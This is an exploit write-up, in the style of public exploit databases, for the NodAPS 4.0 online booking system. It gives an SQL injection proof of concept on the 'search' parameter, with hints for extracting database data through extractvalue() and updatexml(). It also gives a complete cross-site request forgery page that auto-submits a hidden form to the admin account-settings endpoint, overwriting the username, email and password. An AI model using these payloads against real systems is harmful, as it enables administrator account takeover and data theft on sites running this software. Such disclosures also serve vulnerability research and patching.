@@ -1,0 +1,44 @@
+# Exploit Title:  Online Booking system - NodAPS 4.0 - 'search' SQL injection / Cross-Site Request Forgery
+# Date: 2018-05-16
+# Exploit Author: Borna nematzadeh (L0RD)
+# Vendor Homepage: https://codecanyon.net/item/appointment-management-system-nodaps/16197805?s_rank=1535
+# Version: 4.0
+# Tested on: windows
+================================================
+# POC 1 : SQLi
+
+
+# test : test.com/en/providers?search='
+# Description: Put ' in the search parameter and you will have SQL syntax error.
+You can use "extractvalue()" or "updatexml()" functions to get data from database.
+
+================================================
+# POC 2 : CSRF
+
+# Description: An issue was discovered in Online Booking system - NodAPS 4.0 script.
+With Cross-site request forgery (CSRF) vulnerability , attacker can hijack the authentication of users remotely.
+
+================================================
+
+# Exploit :
+
+<html>
+ <head>
+     <title>CSRF POC</title>
+ </head>
+    <body>
+    <form action="http://test.com/admin/accountSetting" method="POST">
+      <input type="hidden" name="data&#91;username&#93;" value="testcsrf />
+      <input type="hidden" name="data&#91;email&#93;" value="lord&#46;nematzadeh123&#64;gmail&#46;com" />
+      <input type="hidden" name="data&#91;firstname&#93;" value="test2" />
+      <input type="hidden" name="data&#91;lastname&#93;" value="test3" />
+      <input type="hidden" name="data&#91;mobile&#93;" value="1000000000" />
+      <input type="hidden" name="data&#91;website&#93;" value="" />
+      <input type="hidden" name="data&#91;password&#93;" value="1234567890&#45;" />
+      <input type="hidden" name="data&#91;language&#95;id&#93;" value="1" />
+    </form>
+    <script>
+        document.forms[0].submit();
+    </script>
+  </body>
+</html>
